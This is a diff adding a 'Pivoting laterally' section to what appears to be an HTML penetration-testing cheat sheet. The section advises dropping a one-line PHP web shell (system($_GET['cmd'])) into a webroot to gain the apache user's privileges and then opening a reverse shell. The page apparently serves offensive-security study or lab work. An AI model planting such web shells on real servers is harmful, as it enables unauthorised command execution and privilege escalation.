@@ -1008,6 +1008,14 @@ mimikatz # sekurlsa::credman  </code></pre>
                         </ul>
                     </ul>
 
+                    <h2 id="Pivoting laterally">Pivoting laterally</h2>
+                    <ul>
+                        <h3>From nomial user to apache user or other</h3>
+                        <p>Just in case you compromised a machine and you have a shell with an unprivleged user. In case there is another user in the box called <b>apache</b> this user might have privileges such as <b>SeImpersonatePrivilege</b>. In order to impersonate this user just drop a php command execution file in the webroot and access that file from the firefox</p>
+                        <pre><code class="language-php">&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+                        <p>Check if you are apache and perform a reverse shell connection via powershell or similar</p>
+                    </ul>
+
                     <h2 id="Run commands as another user">Run commands as another user</h2>
                     <ul>
                         <p>In case you are in an environment where you have credentials for another user but you are not able to stablish a connection though another port or similar there are some ways to execute commands as another user</p>
